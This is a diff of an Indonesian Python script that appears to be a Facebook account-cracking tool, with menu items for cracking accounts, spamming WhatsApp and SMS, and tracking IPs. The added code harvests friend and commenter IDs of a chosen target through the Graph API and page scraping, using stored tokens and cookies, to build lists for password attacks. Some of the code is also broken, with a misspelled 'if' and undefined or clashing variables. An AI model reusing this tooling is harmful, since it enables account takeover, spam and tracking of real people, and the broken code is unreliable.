@@ -676,8 +676,8 @@ dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06'
 tgl = datetime.datetime.now().day
 bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
-ok = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cp = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 #------------------[ MACHINE-SUPPORT ]---------------#
 def alvino_xy(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
@@ -687,9 +687,10 @@ def back():
 	login()
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
-	cetak(panel(f"""[bold green]
-	
-             """,width=100,padding=(0,8),title=f"banner",style=f"bold white"))
+	cetak(panel(f"""[bold green]                ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
+[bold green]                |__] |__/ |__|  \_/  |___ |\ | |\ | |\ | 
+[bold green]                |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
+             """,width=90,padding=(0,8),title=f"Banner",style=f"bold white"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -786,21 +787,19 @@ def menu(id):
 	os.system('clear')
 	banner()
 	negara = requests.get("http://ip-api.com/json/").json()["country"]
-	ip = requests.get("https://api.ipify.org").text
-	cetak(nel('\tSelamat datang ngentod '))
-        negara = requests.get("http://ip-api.com/json/").json()["country"]
 	ip = requests.get("http://ip-api.com/json/").json()["query"]
 	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{waktu}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 3.2[/][/] ',width=43,padding=(0,3),style=f"bold white"))
 	dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{asal_kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{asal_reg}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
-	console.print(Columns(dia))cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Dapunta , Nazri XD And AOREC XD",width=90,title=f"[bold green]Thanks To",padding=(0,5),style=f"bold white"))
+	console.print(Columns(dia))
+	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Dapunta , Nazri XD And AOREC XD",width=90,title=f"[bold green]Thanks To",padding=(0,5),style=f"bold white"))
 	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack From Friends     [bold white][[bold cyan]06[bold white]] Crack From Username[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack From Massal      [bold white][[bold cyan]07[bold white]] Crack From Followers     [[bold cyan]12[bold white]] Spam WhatsApp      \n[bold white][[bold cyan]03[bold white]] Crack From Groups      [[bold cyan]08[bold white]] Crack From Comment       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack From Email       [bold white][[bold cyan]09[bold white]] Check Opsi Checkpoint [bold white]   [[bold cyan]14[bold white]] Track Ip \n[bold white][[bold cyan]05[bold white]] Crack From Files       [bold white][[bold cyan]10[bold white]] [bold white]Check Result Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold white"))
 	_____brayennn___xd____ = input(f' [+] Pilih Menu Crack : ')
 	lf____brayennn___xd____ in ['1','01']:
 		brayen_dump()
 	elif _____brayennn___xd____ in ['2','02']:
-		dump_massal()
+		massal()
 	elif _____brayennn___xd____ in ['3','03']:
-		crack_group()
+		group()
 	elif _____brayennn___xd____ in ['4','04']:
 		crack_email()
 	elif _____brayennn___xd____ in ['5','05']:
@@ -1204,6 +1203,28 @@ def dump_massal():
 		print(f'>>{k} Pertemanan Tidak Public {x}')
 		time.sleep(3)
 		back()
+		#-------------------[ CRACK-PUBLIK-MASSAL]----------------#
+def brayen_dump():
+	try:
+		token = open('.token.txt','r').read()
+		kukis = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
+	pil = input(f' [+] Masukan ID Target : ')
+	try:
+		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
+		for pi in koH['friends']['data']:
+			try:id.append(pi['id']+'|'+pi['name'])
+			except:continue
+		print(f' [+] Total ID Yang Terkumpul : {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(' [+] Internet Lu Gak Ada Anjing')
+		exit()
+	except (KeyError,IOError):
+		print(' [+] Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
+		exit()
 #-------------------[ CRACK-PENGIKUT ]----------------#
 def pengikut():
 	try:
@@ -1338,6 +1359,59 @@ def grup1(urls):
 				lah()
 		except KeyboardInterrupt:
 			lah()
+			###---------[ CRACK DARI KOMEN ]---------- ###
+def komen():
+	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
+	ide = input(f' [+] Masukan Id Postingan : ')
+	url = 'https://mbasic.facebook.com/'+ide
+	try:get_komen(url)
+	except KeyboardInterrupt:setting()
+	if len(dump)==0:
+		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
+		time.sleep(3);exit()
+	setting()
+
+def get_komen(url):
+	data = parser(ses.get(url).text,"html.parser")
+	for isi in data.find_all("h3"):
+		for ids in isi.find_all("a",href=True):
+			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
+			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
+			nama = ids.text
+			if id+"|"+nama in dump:pass
+			else:id.append(id+"|"+nama)
+			sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+	for z in data.find_all("a",href=True):
+		if "Lihat komentar sebelumnya…" in z.text:
+			try:get_komen("https://mbasic.facebook.com"+z["href"])
+			except:pass				
+#-----------------[ TRACK IP ]-----------------# 
+def lacakip():
+	link = input(f' [+] Masukan Ip : ')
+	url = 'http://ip-api.com/json/' + link
+	r = requests.get(url)
+	data = json.loads(r.text)
+	latitude = data['lat']
+	longitude = data['lon']
+	google_maps_url = 'https://www.google.com/maps/place/' + str(latitude) + '+' + str(longitude)
+	try:
+		request = requests.get(url)
+		response = request.json()
+	except (requests.ConnectionError):
+		print(" [+] Koneksi Error")
+		exit()
+	if response['status'] == 'success':
+		print('')
+		print(" [+] Alamat IP : " + response['query'])
+		print(" [+] Kota : " + response['city'])
+		print(" [+] Negara : " + response['country'])
+		print(" [+] Kode Negara : " + response['countryCode'])
+		print(" [+] Latitude : " + str(response['lat']))
+		print(" [+] Longitude : " + str(response['lon']))
+		print(" [+] ISP : " + response['isp'])
+		print(" [+] Link Google Maps :", google_maps_url)
+	else:
+		print(" [+] Alamat IP Yang Dimasukkan Salah")
 #-------------[ CRACK-FROM-FILE ]------------------#
 def crack_file():
 	try:vin = os.listdir('/sdcard/DUMP')
